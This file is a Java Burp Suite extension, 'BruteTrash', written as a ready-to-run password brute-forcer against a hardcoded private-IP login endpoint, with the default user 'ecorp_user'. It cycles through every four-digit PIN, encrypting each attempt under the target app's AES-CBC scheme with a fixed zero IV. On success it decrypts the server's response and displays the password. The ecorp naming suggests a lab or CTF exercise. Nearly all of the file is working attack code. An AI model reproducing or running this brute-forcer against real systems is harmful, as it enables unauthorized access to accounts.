import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class BruteTrash implements BurpExtension {
    private MontoyaApi api;
    private static final String FIXED_IV = "0000000000000000";
    private static final String TARGET_URL = "https://10.81.131.108:8443/";
    private static final String FALLBACK_URL = "http://10.81.131.108:8443/";
    private static final String TARGET_HOST = "10.81.131.108";
    private static final int TARGET_PORT = 8443;
    private static final boolean TARGET_HTTPS = true;

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        api.extension().setName("Burp Password Brute-Forcer");
        SwingUtilities.invokeLater(this::createUI);
    }

    private void createUI() {
        JFrame frame = new JFrame("Brute Force Attack");
        frame.setSize(420, 200);
        frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        frame.setLayout(new GridBagLayout());
        frame.setResizable(false);

        GridBagConstraints gbc = new GridBagConstraints();
        gbc.insets = new Insets(5, 5, 5, 5);
        gbc.fill = GridBagConstraints.HORIZONTAL;

        gbc.gridx = 0;
        gbc.gridy = 0;
        frame.add(new JLabel("Username:"), gbc);

        JTextField usernameField = new JTextField("ecorp_user");
        gbc.gridx = 1;
        frame.add(usernameField, gbc);

        gbc.gridx = 0;
        gbc.gridy = 1;
        frame.add(new JLabel("Target:"), gbc);

        JTextField urlField = new JTextField(TARGET_URL);
        urlField.setEditable(false);
        gbc.gridx = 1;
        frame.add(urlField, gbc);

        JButton startButton = new JButton("Start Attack");
        gbc.gridx = 0;
        gbc.gridy = 2;
        gbc.gridwidth = 2;
        gbc.fill = GridBagConstraints.CENTER;
        frame.add(startButton, gbc);

        frame.setLocationRelativeTo(null);
        frame.setVisible(true);

        startButton.addActionListener((ActionEvent e) -> {
            frame.dispose();
            new Thread(() -> startBruteForce(usernameField.getText().trim())).start();
        });
    }

    private void startBruteForce(String username) {
        if (username.isEmpty()) {
            api.logging().logToOutput("Invalid input: Username is empty.");
            return;
        }

        api.logging().logToOutput("Starting password brute-force on " + TARGET_URL + " with username: " + username);
        String loginUrl = TARGET_URL + "login";
        String fallbackLoginUrl = FALLBACK_URL + "login";

        for (int i = 1; i <= 9999; i++) {
            String password = String.format("%04d", i);

            try {
                SecretKey aesKey = generateAESKey();
                String encodedKey = base64EncodeWithPadding(aesKey.getEncoded());

                String rawdata = "username=" + username + "&password=" + password;
                byte[] encryptedData = encryptAES(rawdata, aesKey);
                String encodedData = base64EncodeWithPadding(encryptedData);

                String postBody = "mac=" + URLEncoder.encode(encodedKey, StandardCharsets.UTF_8) +
                        "&data=" + URLEncoder.encode(encodedData, StandardCharsets.UTF_8);

                HttpResponse response = sendLoginRequest(loginUrl, postBody);
                if (response == null) {
                    api.logging().logToOutput("No HTTPS response for password " + password + ", trying HTTP fallback...");
                    response = sendLoginRequest(fallbackLoginUrl, postBody);
                }

                if (response == null) {
                    api.logging().logToError("No HTTP response for password " + password +
                            " on both HTTPS and HTTP. Skipping...");
                    Thread.sleep(300);
                    continue;
                }

                int statusCode = response.statusCode();
                String responseBody = response.bodyToString();

                api.logging().logToOutput("Password: " + password +
                        " | Status: " + statusCode +
                        " | Response: " + responseBody);

                if (statusCode == 200 && responseBody.contains("result=")) {
                    try {
                        String encryptedBase64 = responseBody.split("=")[1].trim();
                        String base64Decoded = java.net.URLDecoder.decode(encryptedBase64, StandardCharsets.UTF_8);
                        byte[] decodedEncryptedData = Base64.getDecoder().decode(base64Decoded);
                        byte[] decodedKey = Base64.getDecoder().decode(encodedKey);
                        String decryptedResult = decryptAES(decodedKey, decodedEncryptedData);

                        api.logging().logToOutput("Decryption Success: " + decryptedResult);

                        SwingUtilities.invokeLater(() ->
                                JOptionPane.showMessageDialog(null,
                                        "Success! Password is: " + password +
                                                "\nDecrypted Response: " + decryptedResult,
                                        "Brute Force Success",
                                        JOptionPane.INFORMATION_MESSAGE)
                        );

                    } catch (Exception e) {
                        api.logging().logToError("Decryption Failed: " + e.getMessage());
                    }
                    break;
                }

                if (statusCode == 500) {
                    api.logging().logToOutput(" Server returned 500, waiting before retrying...");
                    Thread.sleep(1000);
                }

            } catch (Exception e) {
                api.logging().logToError("Error on password " + password + ": " + e.getMessage());
            }
        }

        api.logging().logToOutput("Brute-force complete!");
    }

    private String decryptAES(byte[] key, byte[] encryptedData) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        IvParameterSpec iv = new IvParameterSpec(FIXED_IV.getBytes(StandardCharsets.UTF_8));
        SecretKey secretKey = new javax.crypto.spec.SecretKeySpec(key, "AES");
        cipher.init(Cipher.DECRYPT_MODE, secretKey, iv);
        return new String(cipher.doFinal(encryptedData), StandardCharsets.UTF_8);
    }

    private SecretKey generateAESKey() throws Exception {
        KeyGenerator keyGen = KeyGenerator.getInstance("AES");
        keyGen.init(128);
        return keyGen.generateKey();
    }

    private String base64EncodeWithPadding(byte[] data) {
        String encoded = Base64.getEncoder().encodeToString(data);
        while (encoded.length() % 4 != 0) {
            encoded += "=";
        }
        return encoded;
    }

    private byte[] encryptAES(String data, SecretKey key) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        IvParameterSpec iv = new IvParameterSpec(FIXED_IV.getBytes(StandardCharsets.UTF_8));
        cipher.init(Cipher.ENCRYPT_MODE, key, iv);
        return cipher.doFinal(data.getBytes(StandardCharsets.UTF_8));
    }

    private HttpResponse sendLoginRequest(String loginUrl, String postBody) {
        try {
            HttpRequest request = HttpRequest.httpRequestFromUrl(loginUrl)
                    .withMethod("POST")
                    .withHeader("Content-Type", "application/x-www-form-urlencoded;charset=UTF-8")
                    .withBody(postBody);

            var requestResult = api.http().sendRequest(request);
            if (requestResult == null) {
                return null;
            }
            return requestResult.response();
        } catch (Exception e) {
            api.logging().logToError("Request failed for " + loginUrl + ": " + e.getMessage());
            return null;
        }
    }

}
